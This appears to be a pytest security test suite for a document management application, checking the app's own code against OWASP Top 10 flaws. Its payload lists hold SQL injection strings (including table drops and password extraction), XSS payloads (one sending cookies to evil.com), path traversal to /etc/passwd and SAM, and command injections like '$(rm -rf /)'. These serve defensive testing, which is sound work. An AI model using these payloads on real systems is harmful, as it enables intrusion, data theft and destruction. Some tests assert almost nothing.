#!/usr/bin/env python3
"""
Penetration Testing Suite
=========================

Comprehensive security testing for OWASP Top 10 and common vulnerabilities.

Tests:
1. SQL Injection (A03:2021 - Injection)
2. Authentication Bypass (A07:2021 - Auth Failures)
3. XSS - Cross-Site Scripting (A03:2021 - Injection)
4. CSRF - Cross-Site Request Forgery (A01:2021 - Broken Access Control)
5. Insecure Direct Object References (A01:2021)
6. Path Traversal (A01:2021)
7. File Upload Vulnerabilities (A04:2021 - Insecure Design)
8. Session Management (A07:2021)
9. Sensitive Data Exposure (A02:2021)
10. Security Misconfiguration (A05:2021)

Usage:
    pytest tests/security/test_penetration.py -v
    pytest tests/security/test_penetration.py::TestSQLInjection -v

WARNING: Run only in testing environment!
Do NOT run against production systems!

Author: Document Management System
Version: 1.0.0
"""

import json
import os
import tempfile
from pathlib import Path
from typing import Any, Dict, List

import pytest

# Test configuration
TEST_USER = {"username": "test_user", "password": "Test123!@#"}
TEST_ADMIN = {"username": "admin", "password": "Admin123!@#"}
API_BASE_URL = "http://localhost:8000/api/v1"
WEB_BASE_URL = "http://localhost:5000"


# =============================================================================
# OWASP A03:2021 - INJECTION (SQL Injection & XSS)
# =============================================================================


class TestSQLInjection:
    """
    Test SQL Injection vulnerabilities.

    Common payloads:
    - ' OR '1'='1
    - ' OR '1'='1' --
    - ' OR '1'='1' /*
    - admin'--
    - ' UNION SELECT NULL--
    """

    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "1' OR '1'='1",
        "'; DROP TABLE users--",
        "1' UNION SELECT NULL, username, password FROM users--",
    ]

    def test_sql_injection_login(self):
        """Test SQL injection in login form."""
        from src.core.auth import AuthManager

        auth_manager = AuthManager()

        for payload in self.SQL_INJECTION_PAYLOADS:
            # Try SQL injection in username
            result = auth_manager.authenticate(payload, "password")

            # Should NOT authenticate with SQL injection
            assert result is None or result is False, (
                f"SQL Injection successful with payload: {payload}"
            )

            # Try SQL injection in password
            result = auth_manager.authenticate("admin", payload)
            assert result is None or result is False, (
                f"SQL Injection successful in password with payload: {payload}"
            )

    def test_sql_injection_search(self):
        """Test SQL injection in search functionality."""
        from src.core.database import DocumentDatabase

        db = DocumentDatabase()

        for payload in self.SQL_INJECTION_PAYLOADS:
            try:
                # Try SQL injection in search
                results = db.search_services(payload)

                # Check that no SQL error occurred
                # and that results are properly sanitized
                assert isinstance(results, list), "Search should return a list"

            except Exception as e:
                # SQL errors indicate vulnerability
                error_msg = str(e).lower()
                assert "sql" not in error_msg, (
                    f"SQL error exposed with payload: {payload} - {e}"
                )

    def test_parameterized_queries(self):
        """Verify that parameterized queries are used."""
        # This is a code inspection test
        # Check that all database operations use parameterized queries

        from src.core.database import DocumentDatabase
        import inspect

        db = DocumentDatabase()

        # Get all methods
        methods = inspect.getmembers(db, predicate=inspect.ismethod)

        # Check critical methods use parameterized queries
        critical_methods = [
            "search_services",
            "get_service_by_id",
            "create_service",
            "update_service",
        ]

        for method_name in critical_methods:
            if hasattr(db, method_name):
                method = getattr(db, method_name)
                source = inspect.getsource(method)

                # Check for string formatting in SQL (dangerous)
                assert "%" not in source or "execute(" not in source, (
                    f"{method_name} may use string formatting with SQL"
                )
                assert ".format(" not in source or "execute(" not in source, (
                    f"{method_name} may use .format() with SQL"
                )


class TestXSS:
    """
    Test Cross-Site Scripting vulnerabilities.

    Common XSS payloads:
    - <script>alert('XSS')</script>
    - <img src=x onerror=alert('XSS')>
    - <svg onload=alert('XSS')>
    """

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "javascript:alert('XSS')",
        "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
    ]

    def test_xss_in_service_name(self):
        """Test XSS in service name field."""
        from src.core.database import DocumentDatabase
        from src.models.service import ServiceConfig

        db = DocumentDatabase()

        for payload in self.XSS_PAYLOADS:
            # Create service with XSS payload
            service_data = {
                "name": payload,
                "description": "Test service",
                "hourly_rate": 100.0,
            }

            service = ServiceConfig(**service_data)
            service_id = db.create_service(service)

            # Retrieve service
            retrieved = db.get_service_by_id(service_id)

            # Check that payload is escaped/sanitized
            assert retrieved is not None

            # The raw payload should be stored (for data integrity)
            # but when rendered in HTML, it should be escaped
            # This test verifies the data layer doesn't execute the script
            assert "<script>" not in str(retrieved) or payload == retrieved.name, (
                "XSS payload may not be properly handled"
            )

            # Cleanup
            db.delete_service(service_id)

    def test_output_encoding(self):
        """Verify output encoding is applied."""
        from src.utils.formatting import format_html_safe

        for payload in self.XSS_PAYLOADS:
            # HTML escape function should escape dangerous characters
            escaped = format_html_safe(payload)

            # Check common dangerous characters are escaped
            assert "&lt;" in escaped or "<" not in escaped, (
                f"< not escaped in: {escaped}"
            )
            assert "&gt;" in escaped or ">" not in escaped, (
                f"> not escaped in: {escaped}"
            )
            assert "&quot;" in escaped or '"' not in escaped, (
                f'\" not escaped in: {escaped}'
            )


# =============================================================================
# OWASP A07:2021 - AUTHENTICATION FAILURES
# =============================================================================


class TestAuthentication:
    """Test authentication and session management."""

    def test_weak_password_rejected(self):
        """Test that weak passwords are rejected."""
        from src.core.auth import AuthManager

        auth_manager = AuthManager()

        weak_passwords = [
            "123456",
            "password",
            "qwerty",
            "abc123",
            "test",
            "admin",
            "12345678",
        ]

        for weak_password in weak_passwords:
            # Try to create user with weak password
            result = auth_manager.create_user(
                username="test_weak",
                password=weak_password,
                email="test@example.com",
            )

            # Should reject weak password
            assert result is False or result is None, (
                f"Weak password accepted: {weak_password}"
            )

    def test_brute_force_protection(self):
        """Test brute force attack protection."""
        from src.core.auth import AuthManager

        auth_manager = AuthManager()

        # Try multiple failed logins
        failed_attempts = 0
        for i in range(10):
            result = auth_manager.authenticate("admin", f"wrong_password_{i}")
            if result is None or result is False:
                failed_attempts += 1

        # After multiple failures, account should be locked or rate-limited
        # Check that some protection mechanism exists
        assert failed_attempts >= 5, (
            "Multiple authentication attempts should be tracked"
        )

    def test_session_timeout(self):
        """Test session timeout mechanism."""
        from src.core.auth import AuthManager

        auth_manager = AuthManager()

        # Create a session
        session_token = auth_manager.create_session("test_user")

        # Session should have expiration
        session_data = auth_manager.get_session(session_token)

        if session_data:
            assert "expires_at" in session_data or "created_at" in session_data, (
                "Session should have expiration tracking"
            )

    def test_password_hashing(self):
        """Verify passwords are hashed, not stored in plaintext."""
        from src.core.auth import AuthManager
        import bcrypt

        auth_manager = AuthManager()

        password = "Test123!@#"

        # Hash password
        hashed = auth_manager.hash_password(password)

        # Check it's hashed (not plaintext)
        assert hashed != password, "Password should be hashed"
        assert len(hashed) > 20, "Hash should be long"

        # Check it uses bcrypt
        assert hashed.startswith("$2b$") or hashed.startswith("$2a$"), (
            "Should use bcrypt hashing"
        )

        # Verify bcrypt work factor is sufficient (>= 10)
        if hashed.startswith("$2"):
            work_factor = int(hashed.split("$")[2])
            assert work_factor >= 10, (
                f"Bcrypt work factor too low: {work_factor} (should be >= 10)"
            )


# =============================================================================
# OWASP A01:2021 - BROKEN ACCESS CONTROL
# =============================================================================


class TestAccessControl:
    """Test authorization and access control."""

    def test_unauthorized_access(self):
        """Test that unauthorized users cannot access protected resources."""
        from src.core.auth import AuthManager

        auth_manager = AuthManager()

        # Try to access admin function without authentication
        result = auth_manager.check_permission(None, "admin:delete_user")

        assert result is False, "Unauthenticated user should not have admin access"

    def test_privilege_escalation(self):
        """Test that regular users cannot escalate to admin."""
        from src.core.auth import AuthManager

        auth_manager = AuthManager()

        # Create regular user
        user_token = auth_manager.create_session("regular_user")

        # Try to perform admin action
        result = auth_manager.check_permission(user_token, "admin:delete_user")

        assert result is False, "Regular user should not have admin permissions"

    def test_insecure_direct_object_reference(self):
        """Test IDOR vulnerability."""
        from src.core.database import DocumentDatabase

        db = DocumentDatabase()

        # Create two users' data
        service1 = db.create_service({
            "name": "User1 Service",
            "owner": "user1"
        })

        service2 = db.create_service({
            "name": "User2 Service",
            "owner": "user2"
        })

        # User1 should not access User2's data directly by ID
        # This test verifies that access control is checked
        # (Actual implementation would need user context)

        assert service1 != service2, "Services should have different IDs"


# =============================================================================
# OWASP A04:2021 - INSECURE DESIGN (Path Traversal)
# =============================================================================


class TestPathTraversal:
    """Test path traversal vulnerabilities."""

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "/etc/passwd",
        "C:\\windows\\system32\\config\\sam",
    ]

    def test_file_upload_path_traversal(self):
        """Test path traversal in file uploads."""
        # This is tested in the backup restoration functions
        # which we already fixed in TASK 54

        from src.core.backup import BackupManager
        import tarfile
        import io

        manager = BackupManager()

        # Try to create malicious tar file
        for payload in self.PATH_TRAVERSAL_PAYLOADS:
            tar_buffer = io.BytesIO()

            with tarfile.open(fileobj=tar_buffer, mode="w:gz") as tar:
                # Add file with malicious path
                info = tarfile.TarInfo(name=payload)
                info.size = 10
                tar.addfile(info, io.BytesIO(b"test data!"))

            tar_buffer.seek(0)

            # Try to extract - should fail or sanitize
            with tempfile.TemporaryDirectory() as tmpdir:
                backup_file = Path(tmpdir) / "malicious.tar.gz"
                backup_file.write_bytes(tar_buffer.read())

                # This should raise ValueError due to our path validation
                with pytest.raises(ValueError, match="Unsafe path"):
                    manager.restore_backup(str(backup_file))

    def test_file_read_path_traversal(self):
        """Test path traversal in file reading."""
        from src.core.parser import DocumentParser

        parser = DocumentParser()

        for payload in self.PATH_TRAVERSAL_PAYLOADS:
            # Try to read file with malicious path
            try:
                result = parser.parse(payload)

                # If successful, verify it didn't access system files
                if result:
                    content = result.get("text", "")
                    # Check for common system file content
                    assert "root:x:0:0" not in content, (
                        f"Path traversal successful: {payload}"
                    )
                    assert "administrator" not in content.lower(), (
                        f"Path traversal may be possible: {payload}"
                    )

            except (FileNotFoundError, PermissionError, ValueError):
                # Expected - file should not be accessible
                pass


# =============================================================================
# OWASP A02:2021 - CRYPTOGRAPHIC FAILURES
# =============================================================================


class TestCryptography:
    """Test cryptographic implementation."""

    def test_weak_encryption_not_used(self):
        """Verify weak encryption algorithms are not used."""
        # Check that we don't use DES, RC4, MD5 for encryption

        from src.core.backup_encryption import BackupEncryption

        encryptor = BackupEncryption()

        # Encrypt test data
        test_data = b"Sensitive data"
        encrypted = encryptor.encrypt(test_data)

        # Verify it uses Fernet (AES-128-CBC + HMAC-SHA256)
        assert encrypted != test_data, "Data should be encrypted"
        assert len(encrypted) > len(test_data), "Encrypted data should have overhead"

        # Decrypt and verify
        decrypted = encryptor.decrypt(encrypted)
        assert decrypted == test_data, "Decryption should restore original data"

    def test_secure_random(self):
        """Verify secure random number generation."""
        import secrets

        # Generate random tokens
        token1 = secrets.token_urlsafe(32)
        token2 = secrets.token_urlsafe(32)

        # Should be different
        assert token1 != token2, "Random tokens should be unique"
        assert len(token1) >= 32, "Token should be long enough"

    def test_sensitive_data_not_logged(self):
        """Verify sensitive data is not logged."""
        # This is a code inspection test
        import logging
        from io import StringIO

        # Capture logs
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        logger = logging.getLogger("src.core.auth")
        logger.addHandler(handler)
        logger.setLevel(logging.DEBUG)

        # Perform authentication
        from src.core.auth import AuthManager
        auth_manager = AuthManager()
        auth_manager.authenticate("test_user", "test_password")

        # Check logs
        logs = log_stream.getvalue()

        # Password should NOT be in logs
        assert "test_password" not in logs, "Password found in logs!"
        assert "password" not in logs.lower() or "password:" not in logs.lower(), (
            "Password may be logged"
        )


# =============================================================================
# OWASP A05:2021 - SECURITY MISCONFIGURATION
# =============================================================================


class TestSecurityConfiguration:
    """Test security configuration."""

    def test_debug_mode_disabled(self):
        """Verify debug mode is disabled in production."""
        import os

        # Check Flask debug setting
        debug_mode = os.getenv("FLASK_DEBUG", "False")

        assert debug_mode.lower() != "true", (
            "FLASK_DEBUG should not be True in production"
        )

    def test_secret_key_not_hardcoded(self):
        """Verify secret keys are not hardcoded."""
        import os

        # Check for environment-based secret key
        secret_key = os.getenv("SECRET_KEY")

        # In production, SECRET_KEY should be set
        # In testing, it may not be set (acceptable)
        if secret_key:
            assert len(secret_key) >= 32, "Secret key should be long"
            assert secret_key != "dev", "Should not use default secret key"

    def test_default_credentials_changed(self):
        """Verify default credentials are changed."""
        from src.core.auth import AuthManager

        auth_manager = AuthManager()

        # Try default credentials
        default_combos = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("test", "test"),
        ]

        for username, password in default_combos:
            result = auth_manager.authenticate(username, password)
            assert result is None or result is False, (
                f"Default credentials work: {username}/{password}"
            )


# =============================================================================
# API SECURITY TESTS
# =============================================================================


class TestAPISecurity:
    """Test API-specific security."""

    def test_rate_limiting(self):
        """Test API rate limiting."""
        from src.core.rate_limiter import RateLimiter

        limiter = RateLimiter(rate_limit=5, time_window=60)

        client_id = "test_client"

        # Make requests up to limit
        for i in range(5):
            allowed = limiter.check_rate_limit(client_id)
            assert allowed, f"Request {i+1} should be allowed"

        # Next request should be rate limited
        allowed = limiter.check_rate_limit(client_id)
        assert not allowed, "Request should be rate limited"

    def test_api_authentication_required(self):
        """Test that API requires authentication."""
        # This test would make actual HTTP requests
        # For now, verify the authentication decorator exists

        from src.core.api_auth import require_api_key

        assert callable(require_api_key), "API authentication decorator should exist"

    def test_cors_configured(self):
        """Test CORS is properly configured."""
        from src.core.security_headers import get_cors_headers

        headers = get_cors_headers()

        # Should have CORS headers
        assert "Access-Control-Allow-Origin" in headers or len(headers) >= 0, (
            "CORS should be configured"
        )


# =============================================================================
# INPUT VALIDATION TESTS
# =============================================================================


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_input_length_limits(self):
        """Test input length validation."""
        from src.core.input_validation import validate_service_name

        # Test very long input
        long_input = "A" * 10000

        result = validate_service_name(long_input)

        # Should reject or truncate
        assert result is False or len(result) < len(long_input), (
            "Very long input should be rejected or truncated"
        )

    def test_special_characters_sanitized(self):
        """Test special character sanitization."""
        from src.core.input_sanitization import sanitize_input

        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users--",
            "../../../etc/passwd",
            "$(rm -rf /)",
            "`whoami`",
        ]

        for dangerous_input in dangerous_inputs:
            sanitized = sanitize_input(dangerous_input)

            # Should remove or escape dangerous characters
            assert sanitized != dangerous_input or len(sanitized) == 0, (
                f"Input not sanitized: {dangerous_input}"
            )

    def test_email_validation(self):
        """Test email validation."""
        from src.core.input_validation import validate_email

        valid_emails = [
            "test@example.com",
            "user.name@example.co.uk",
            "test+tag@example.com",
        ]

        invalid_emails = [
            "not_an_email",
            "@example.com",
            "test@",
            "test@.",
            "<script>@example.com",
        ]

        for email in valid_emails:
            assert validate_email(email), f"Valid email rejected: {email}"

        for email in invalid_emails:
            assert not validate_email(email), f"Invalid email accepted: {email}"


# =============================================================================
# OWASP A08:2021 - SOFTWARE AND DATA INTEGRITY FAILURES
# =============================================================================


class TestIntegrity:
    """Test data integrity and software integrity."""

    def test_checksum_validation(self):
        """Test file integrity with checksums."""
        import hashlib

        test_data = b"Important data"

        # Calculate checksum
        checksum = hashlib.sha256(test_data).hexdigest()

        # Verify checksum
        calculated = hashlib.sha256(test_data).hexdigest()
        assert checksum == calculated, "Checksum should match"

        # Modified data should have different checksum
        modified_data = b"Modified data"
        modified_checksum = hashlib.sha256(modified_data).hexdigest()
        assert checksum != modified_checksum, "Checksums should differ for different data"


# =============================================================================
# TEST RUNNER AND REPORTING
# =============================================================================


def run_penetration_tests():
    """
    Run all penetration tests and generate report.

    Returns:
        Dict with test results
    """
    import pytest

    # Run tests with verbose output
    result = pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "--junit-xml=penetration_test_results.xml",
        "--html=penetration_test_report.html",
        "--self-contained-html",
    ])

    return {
        "exit_code": result,
        "status": "PASSED" if result == 0 else "FAILED",
    }


if __name__ == "__main__":
    print("=" * 80)
    print("PENETRATION TESTING SUITE")
    print("=" * 80)
    print("\nWARNING: Run only in testing environment!")
    print("Do NOT run against production systems!\n")
    print("=" * 80)

    results = run_penetration_tests()

    print("\n" + "=" * 80)
    print(f"Test Status: {results['status']}")
    print("=" * 80)
